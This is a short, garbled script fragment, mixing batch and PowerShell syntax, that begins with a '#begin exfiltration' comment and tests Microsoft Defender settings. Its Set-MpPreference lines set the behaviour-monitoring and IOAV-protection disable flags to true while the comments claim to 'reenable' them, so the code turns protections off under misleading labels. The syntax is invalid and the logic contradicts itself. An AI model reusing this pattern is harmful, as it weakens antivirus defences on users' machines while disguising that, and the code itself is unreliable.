rem #begin exfiltration
if (AntivirusEnabled == False) start Update-MpSignature

rem #if defender is disabled, update the signature
if (AntivirusEnabled == False) Set AntivirusEnabled = True

if(Set-MpPreference -DisableBehaviorMonitoring == False) set -disablebehaviormonitoring $true
REM #reenable behavior monitoring


if(Set-MpPreference -DisableIOAVProtection == False) set -disableioavprotection $true
REM #reenable IOAV PROTECTION
